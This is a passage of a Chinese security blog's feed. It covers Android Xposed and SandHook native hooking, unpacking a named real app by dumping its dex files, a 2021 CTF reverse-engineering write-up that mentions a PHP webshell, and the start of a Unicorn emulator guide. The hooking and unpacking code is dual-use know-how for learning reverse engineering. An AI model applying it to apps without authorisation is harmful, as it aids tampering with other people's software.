class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>       <span class="hljs-keyword">if</span>(lpparam.packageName.equals(<span class="hljs-string">&quot;com.example.s1_jni&quot;</span>)) &#123;<br>           System.load(<span class="hljs-string">&quot;/data/local/tmp/hookso_1.so&quot;</span>);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>在上一节中我们hook的是系统函数strstr，这里我们学习插件hook，就是直接hook我们自己写的函数。</p><p><img src="/2021/08/10/Xposed%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20210816143036285.png" alt="image-20210816143036285"></p><p>hook系统函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *buf= <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">char</span> *&gt;(<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>));<br><span class="hljs-keyword">void</span> *handle = dlopen_compat(<span class="hljs-string">&quot;libc.so&quot;</span>, RTLD_NOW);<br><span class="hljs-keyword">void</span> *open_co = dlsym_compat(handle,<span class="hljs-string">&quot;__system_property_get&quot;</span>);<br>syscall mysdk=(syscall)open_co;<br>mysdk(<span class="hljs-string">&quot;ro.build.version.sdk&quot;</span>,buf);<br><br>__android_log_print(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;s1lenc3&quot;</span>,<span class="hljs-string">&quot;my arg1 is %s&quot;</span>,buf);<br></code></pre></td></tr></table></figure><p>64位 native hook：</p><p><a href="https://github.com/asLody/SandHook">https://github.com/asLody/SandHook</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span> * (*old_strstr)(<span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span> *) = <span class="hljs-literal">nullptr</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">new_strstr</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* a, <span class="hljs-keyword">char</span>* b)</span></span>&#123;<br>    __android_log_print(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;s1lenc3&quot;</span>, <span class="hljs-string">&quot;i am sandhook strstr&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(b,<span class="hljs-string">&quot;s1lenc3&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">int</span> a=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> &amp;a;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> old_strstr(a,b);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">JNICALL jint <span class="hljs-title">JNI_OnLoad</span><span class="hljs-params">(JavaVM *vm, <span class="hljs-keyword">void</span>* re)</span></span>&#123;<br>    __android_log_print(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;s1lenc3&quot;</span>, <span class="hljs-string">&quot;i am sandhook jni_onload&quot;</span>);<br>    old_strstr = <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">void</span> *(*)(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">char</span>*)&gt;(SandInlineHookSym(<span class="hljs-string">&quot;/system/lib/libc.so&quot;</span>, <span class="hljs-string">&quot;strstr&quot;</span>,<span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">void</span> *&gt;(new_strstr)));<br>    <span class="hljs-keyword">return</span> JNI_VERSION_1_6;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="xposed检测和脱壳"><a href="#xposed检测和脱壳" class="headerlink" title="xposed检测和脱壳"></a>xposed检测和脱壳</h1><p>安装xposed checker进行xposed检测。</p><p>hook脱壳点进行dump dex文件进行脱壳。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">JNICALL jint  <span class="hljs-title">JNI_OnLoad</span><span class="hljs-params">(JavaVM *vm,<span class="hljs-keyword">void</span>* re)</span></span>&#123;<br><br>    __android_log_print(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;s1lenc3&quot;</span>,<span class="hljs-string">&quot;i am from jni_onload&quot;</span>);<br>    old_strstr= <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">void</span> *(*)(<span class="hljs-keyword">int</span> *, <span class="hljs-keyword">int</span> *, <span class="hljs-keyword">int</span> *, <span class="hljs-keyword">int</span> *, <span class="hljs-keyword">int</span> *, <span class="hljs-keyword">int</span> *)&gt;(SandInlineHookSym(<br>            <span class="hljs-string">&quot;/system/lib/libart.so&quot;</span>,<br>            <span class="hljs-string">&quot;_ZN3art11ClassLinker10LoadMethodEPNS_6ThreadERKNS_7DexFileERKNS_21ClassDataItemIteratorENS_6HandleINS_6mirror5ClassEEEPNS_9ArtMethodE&quot;</span>,<br>            <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">void</span> *&gt;(new_strstr)));<br><br><br>    <span class="hljs-keyword">return</span> JNI_VERSION_1_6;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><p><strong>xposed免重启</strong></p><p>替换XposedBridge.jar文件。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">adb <span class="hljs-keyword">push</span> XposedBridge.jar <span class="hljs-regexp">/sdcard/</span><br>mount -o rw,remount -t auto /system<br>cp XposedBridge.jar <span class="hljs-regexp">/system/</span>framework/<br>重启手机<br></code></pre></td></tr></table></figure><p><strong>fdex2</strong></p><p>原理：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">hook Classloader-&gt;load<span class="hljs-constructor">Class(String, <span class="hljs-params">bool</span>)</span><br>getResult.get<span class="hljs-constructor">Dex()</span>.get<span class="hljs-constructor">Bytes()</span>;<br>FIO写入sdcard<br></code></pre></td></tr></table></figure><p>改进延时hook：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeByte</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bArr, String str)</span> </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(str);<br>        fileOutputStream.write(bArr);<br>        fileOutputStream.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br>&#125;<br>    <span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br><br>    <span class="hljs-keyword">if</span>(lpparam.packageName.equals(<span class="hljs-string">&quot;com.aipao.hanmoveschool&quot;</span>))&#123;<br>        <span class="hljs-keyword">new</span> Thread(<span class="hljs-keyword">new</span> Runnable() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Thread.sleep(<span class="hljs-number">5</span>*<span class="hljs-number">1000</span>);<br>                  ClassLoader loader=lpparam.classLoader;<br>                  Class classone=loader.loadClass(<span class="hljs-string">&quot;com.aipao.hanmoveschool.activity.LoginActivity&quot;</span>);<br>                  Object dex=XposedHelpers.callMethod(classone,<span class="hljs-string">&quot;getDex&quot;</span>);<br>                  <span class="hljs-keyword">byte</span>[] bytes= (<span class="hljs-keyword">byte</span>[]) XposedHelpers.callMethod(dex,<span class="hljs-string">&quot;getBytes&quot;</span>);<br>                    String path=<span class="hljs-string">&quot;/sdcard/&quot;</span>+bytes.length+<span class="hljs-string">&quot;.dex&quot;</span>;<br>                writeByte(bytes,path);<br>                &#125; <span class="hljs-keyword">catch</span> (InterruptedException | ClassNotFoundException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;).start();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Android应用安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>巅峰极客2021逆向wp</title>
    <link href="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/"/>
    <url>/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/</url>
    
    <content type="html"><![CDATA[<h1 id="baby-maze"><a href="#baby-maze" class="headerlink" title="baby_maze"></a>baby_maze</h1><p>没有迷宫数据，一堆函数调用，得写脚本跑了，使用idapython。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">我们可以找到最后提示成功的函数，然后通过交叉引用获取上层调用的函数，一直追溯到开始，跑出函数调用流程。<br>对于获取WASD方向，分析函数时发现在调用方向函数时有<span class="hljs-keyword">switch</span> <span class="hljs-keyword">case</span> xx 的注释，直接去获取注释，即可得到路径。<br></code></pre></td></tr></table></figure><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210803155926749.png" alt="image-20210803155926749"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>start_addr = <span class="hljs-number">0x54de35</span>  <span class="hljs-comment">#提示成功的函数地址</span><br>end_addr = <span class="hljs-number">0x40187c</span>    <span class="hljs-comment">#迷宫开始的函数地址</span><br>call_path = []<br>md5 = hashlib.md5()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">call_addr, call_list, maze_path=<span class="hljs-string">&quot;S&quot;</span></span>):</span> <span class="hljs-comment">#因为0x40187前边还有一个S，所以这里先给个S</span><br>    <span class="hljs-keyword">if</span> call_addr == end_addr:   <span class="hljs-comment">#追溯到最初的函数时，进行提取WASD方向，并且计算flag</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;search success&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(call_path)-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            switch = GetCommentEx(<span class="hljs-built_in">int</span>(call_path[i], <span class="hljs-number">16</span>)-<span class="hljs-number">5</span>, <span class="hljs-literal">True</span>)  <span class="hljs-comment">#通过注释获取switch case</span><br>            case_num = <span class="hljs-built_in">int</span>(switch[-<span class="hljs-number">2</span>:], <span class="hljs-number">10</span>)<br>            maze_path += <span class="hljs-built_in">chr</span>(case_num)<br>        md5.update(maze_path.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;&quot;</span> + md5.hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">for</span> refs <span class="hljs-keyword">in</span> CodeRefsTo(call_addr, <span class="hljs-number">0</span>): <span class="hljs-comment">#获取交叉引用的地址</span><br>        fun_name = GetFunctionName(refs)<br>        fun_addr = LocByName(fun_name)   <span class="hljs-comment">#获取交叉引用的地址所在的函数，并且得到地址，进行下一次交叉引用</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hex</span>(fun_addr) <span class="hljs-keyword">in</span> call_list:   <span class="hljs-comment">#判断此路径可否继续</span><br>            <span class="hljs-keyword">continue</span><br>        call_list.append(<span class="hljs-built_in">hex</span>(fun_addr))<br>        call_path.append(<span class="hljs-built_in">hex</span>(refs))<br>        search(fun_addr, call_list)<br>        call_list.remove(<span class="hljs-built_in">hex</span>(fun_addr))<br>        call_path.remove(<span class="hljs-built_in">hex</span>(refs))<br>cl = []<br>search(start_addr, cl)<br></code></pre></td></tr></table></figure><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210803160610738.png" alt="image-20210803160610738"></p><h1 id="medical-APP"><a href="#medical-APP" class="headerlink" title="medical_APP"></a>medical_APP</h1><p>反编译，java没什么东西，直接看native层。</p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210731182247701.png" alt="image-20210731182247701"></p><p>dump比较的数据，进行xxtea解密。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdint.h&gt;</span><br><span class="hljs-comment">#define DELTA 0x9F5776B6</span><br><span class="hljs-comment">#define MX (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span><br><br>void btea(uint32_t *v, <span class="hljs-keyword">int</span> n, uint32_t const key[<span class="hljs-number">4</span>])<br>&#123;<br>    uint32_t <span class="hljs-keyword">y</span>, z, sum;<br>    unsigned p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) /* Coding Part *<span class="hljs-regexp">/</span><br><span class="hljs-regexp">    &#123;</span><br><span class="hljs-regexp">        rounds = 6 + 52 /</span> n;<br>        sum = DELTA;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)<br>            &#123;<br>                <span class="hljs-keyword">y</span> = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            <span class="hljs-keyword">y</span> = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>            <span class="hljs-regexp">//prin</span>tf(<span class="hljs-string">&quot;%x\n&quot;</span>, <span class="hljs-keyword">y</span>);<br>            sum -= <span class="hljs-number">0x60A8894A</span>;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; -<span class="hljs-number">1</span>) /* Decoding Part *<span class="hljs-regexp">/</span><br><span class="hljs-regexp">    &#123;</span><br><span class="hljs-regexp">        n = -n;</span><br><span class="hljs-regexp">        rounds = 6 + 52 /</span> n;<br>        sum = rounds * DELTA;<br>        <span class="hljs-keyword">y</span> = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)<br>            &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">y</span> = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">y</span> = v[<span class="hljs-number">0</span>] -= MX;<br>            sum += <span class="hljs-number">0x60A8894A</span>;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">int</span> main()<br>&#123;<br>    <span class="hljs-regexp">//</span> uint32_t v[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">0x87e25a01</span>, <span class="hljs-number">0x3c4364d2</span>, <span class="hljs-number">0x0ec3cc97</span>, <span class="hljs-number">0xd06cbb92</span>, <span class="hljs-number">0xb8411653</span>, <span class="hljs-number">0x43e7378d</span>, <span class="hljs-number">0x52947a3b</span>, <span class="hljs-number">0x1e5abac4</span>, <span class="hljs-number">0xd75382e7</span>&#125;;<br>    uint32_t v[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">0xc5268710</span>, <span class="hljs-number">0x6d7b0e5e</span>, <span class="hljs-number">0xc5d265c7</span>, <span class="hljs-number">0xda3a935f</span>, <span class="hljs-number">0xa0c5a950</span>, <span class="hljs-number">0x2daeb502</span>, <span class="hljs-number">0x228e3628</span>, <span class="hljs-number">0x1db6ceb5</span>, <span class="hljs-number">0xd5386a5</span>&#125;;<br>    uint32_t ss[<span class="hljs-number">9</span>] = &#123;<br>        <span class="hljs-number">0x68E5973E</span>, <span class="hljs-number">0xC20C7367</span>, <span class="hljs-number">0x98AFD41B</span>, <span class="hljs-number">0xFE4B9DE2</span>, <span class="hljs-number">0x01A5B60B</span>, <span class="hljs-number">0x3D36D646</span>, <span class="hljs-number">0xDBCC7BAF</span>, <span class="hljs-number">0xA0414F00</span>,<br>        <span class="hljs-number">0x762CE71A</span>&#125;;<br>    uint32_t const k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x1000</span>&#125;;<br>    <span class="hljs-keyword">int</span> n = <span class="hljs-number">9</span>; <span class="hljs-regexp">//n</span>的绝对值表示v的长度，取正表示加密，取负表示解密<br>    // v为要加密的数据是两个<span class="hljs-number">32</span>位无符号整数<br>    // k为加密解密密钥，为<span class="hljs-number">4</span>个<span class="hljs-number">32</span>位无符号整数，即密钥长度为<span class="hljs-number">128</span>位<br>    // <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;加密前原始数据：%x %x %x %x %x %x %x %x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>], v[<span class="hljs-number">6</span>], v[<span class="hljs-number">7</span>]);<br>    <span class="hljs-regexp">//</span>btea(v, n, k);<br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;加密后的数据：%x %x %x %x %x %x %x %x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>], v[<span class="hljs-number">6</span>], v[<span class="hljs-number">7</span>]);<br>    btea(ss, -n, k);<br>    <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;解密后的数据：%x %x %x %x %x %x %x %x %x\n&quot;</span>, ss[<span class="hljs-number">0</span>], ss[<span class="hljs-number">1</span>], ss[<span class="hljs-number">2</span>], ss[<span class="hljs-number">3</span>], ss[<span class="hljs-number">4</span>], ss[<span class="hljs-number">5</span>], ss[<span class="hljs-number">6</span>], ss[<span class="hljs-number">7</span>], ss[<span class="hljs-number">8</span>]);<br>    <span class="hljs-regexp">//prin</span>tf(<span class="hljs-string">&quot;加密前原始数据：%x %x %x %x %x %x %x %x %x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>], v[<span class="hljs-number">6</span>], v[<span class="hljs-number">7</span>], v[<span class="hljs-number">8</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后进行rc4解密。</p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210731182357172.png" alt="image-20210731182357172"></p><h1 id="so-get-sourcecode"><a href="#so-get-sourcecode" class="headerlink" title="so_get_sourcecode"></a><strong>so_get_sourcecode</strong></h1><p>人麻了，逆向狗做web，还好知道一句话木马。蚁剑连接。</p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210731200056596.png" alt="image-20210731200056596"></p><p>看见flag.php激动了，将文件都下载下来，全是乱码。</p><p>估计是被加密了，搜索了半天，使用dezend解密，也不对，然后搜到了php_screw,好像有点思路了。</p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210731200153176.png" alt="image-20210731200153176"></p><p>加强版的，再搜，搜到了源码，真不错。</p><p><a href="https://github.com/del-xiong/screw-plus">https://github.com/del-xiong/screw-plus</a></p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210731200331762.png" alt="image-20210731200331762"></p><p>好吧，，大部分时间在搭建这个web环境。最后整好了，解密，还是乱码，估计魔改了吧，去分析题目中的php_screw_plus.so。</p><p>通过逆向与源码对比，发现一下几处需要修改或添加：</p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210731202702111.png" alt="image-20210731202702111"></p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210731202737305.png" alt="image-20210731202737305"></p><p>最后的异或数据怎么得到：</p><p>分析teg_yek得到返回的数据，也就是最后要进行异或的数据。</p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210803161620817.png" alt="image-20210803161620817"></p><p>而如果要修改源码的话，buf和path两个变量的顺序一定要弄对了，否则会得到不确定的值，解密肯定会失败。</p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210803161845783.png" alt="image-20210803161845783"></p><p>修改源码进行再次编译。</p><p><img src="/2021/08/03/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021%E9%80%86%E5%90%91wp/image-20210731204057750.png" alt="image-20210731204057750"></p>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unicorn入门及强网杯unicorn_like_a_pro复现</title>
    <link href="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="unicorn简介及安装"><a href="#unicorn简介及安装" class="headerlink" title="unicorn简介及安装"></a>unicorn简介及安装</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">Unicorn 是一个基于QEMU的轻量级、多平台、多架构的 CPU 模拟器框架。我们可以更好地关注CPU操作, 忽略机器设备的差异. 想象一下, 我们可以将其应用于这些情景: 比如我们单纯只是需要模拟代码的执行而非需要一个真的CPU去完成那些操作, 又或者想要更安全地分析恶意代码, 检测病毒特征, 或者想要在逆向过程中验证某些代码的含义. 使用CPU模拟器可以很好地帮助我们提供便捷。<br>Unicorn 提供了一些非常NB的功能：<br>多架构：ARM、ARM64 (ARMv8)、M68K、MIPS、SPARC 和 X86（<span class="hljs-number">16</span>、<span class="hljs-number">32</span>、<span class="hljs-number">64</span> 位）<br>干净<span class="hljs-regexp">/简单/</span>轻量级/直观的架构中立 API<br>用纯 C 语言实现，绑定了 Crystal、Clojure、Visual Basic、Perl、Rust、Ruby、Python、Java、.NET、Go、Delphi/Free Pascal、Haskell、Pharo 和 Lua。<br>原生支持Windows 和 *nix（已确认 Mac OSX、Linux、*BSD 和 Solaris）<br>高性能JIT即时编译<br>更多信息请访问http:<span class="hljs-regexp">//</span>www.unicorn-engine.org<br></code></pre></td></tr></table></figure><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><ul><li>调用恶意函数时，不需要开启一个有害进程</li><li>在CTF竞赛中难度比较大的题目</li><li>模糊测试</li><li>用于gdb插件, 基于代码模拟执行的插件</li><li>模拟执行一些混淆代码</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里以最简单的python模块安装为例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip</span>/pip<span class="hljs-number">3</span> install unicorn<br></code></pre></td></tr></table></figure><p>Python3即可安装成功，其他平台编译安装网上有很多教程。</p><p>也可下载源码进行编译。</p><h1 id="unicorn使用指南"><a href="#unicorn使用指南" class="headerlink" 